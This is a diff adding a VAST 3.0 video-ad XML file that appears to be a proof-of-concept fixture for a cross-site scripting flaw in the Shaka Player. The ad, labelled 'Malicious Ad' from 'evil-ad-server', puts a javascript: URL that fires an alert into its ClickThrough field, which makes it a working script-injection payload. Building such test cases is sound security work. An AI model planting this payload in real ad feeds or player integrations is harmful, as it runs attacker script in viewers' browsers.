@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<VAST version="3.0">
+  <Ad id="1337">
+    <InLine>
+      <AdSystem>evil-ad-server</AdSystem>
+      <AdTitle>Malicious Ad</AdTitle>
+
+      <Creatives>
+        <Creative>
+          <Linear>
+            <Duration>00:00:10</Duration>
+
+            <VideoClicks>
+              <ClickThrough><![CDATA[
+                javascript:alert('XSS via Shaka VAST ClickThrough')
+              ]]></ClickThrough>
+            </VideoClicks>
+
+            <MediaFiles>
+              <MediaFile delivery="progressive"
+                         type="video/mp4"
+                         width="640"
+                         height="360">
+                https://storage.googleapis.com/shaka-demo-assets/angel-one.mp4
+              </MediaFile>
+            </MediaFiles>
+          </Linear>
+        </Creative>
+      </Creatives>
+
+    </InLine>
+  </Ad>
+</VAST>
